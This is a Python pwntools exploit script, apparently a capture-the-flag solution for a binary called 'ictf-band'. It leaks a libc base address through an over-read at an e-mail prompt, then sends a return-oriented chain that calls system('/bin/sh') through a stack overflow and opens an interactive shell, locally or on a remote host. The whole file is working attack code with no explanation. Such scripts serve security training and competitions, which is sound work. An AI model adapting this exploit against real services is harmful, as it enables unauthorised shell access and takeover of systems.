#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ictf-band_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x189F 
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def leak_libc():
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b"Slot [1-5]:", b"7")
    io.sendlineafter(b"Album Count:", b"0")
    io.sendlineafter(b"[y/n]:", b"y")
    io.sendlineafter(b"Tell us how many you want, we will contact you soon:", b"17")
    io.recvuntil("Tell us your e-mail:")
    io.sendline(b'a'*16)
    io.recvuntil(b"a"*16)
    io.recvline()
    libc.address = u64(b'\x00' + io.recvline().strip().ljust(7, b'\x00')) - 0x21b700

    io.sendlineafter(b":", b"y")

def solve():

    leak_libc()

    offset = 0x98
    pop_rdi = libc.address + 0x000000000002a3e5
    sh = next(libc.search(b'/bin/sh\x00'))
    ret = libc.address + 0x0000000000029139
    system = libc.sym['system']


    info("libc base: %#x", libc.address)

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b"Slot [1-5]:", b"7")
    io.sendlineafter(b"Album Count:", b"0")
    io.sendlineafter(b"[y/n]:", b"y")
    io.sendlineafter(b"Tell us how many you want, we will contact you soon:", str(len(payload)+1).encode())
    io.recvuntil("Tell us your e-mail:")
    io.sendline(payload)
    io.sendlineafter(b"It's verified [y/n]:", b"y")


    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

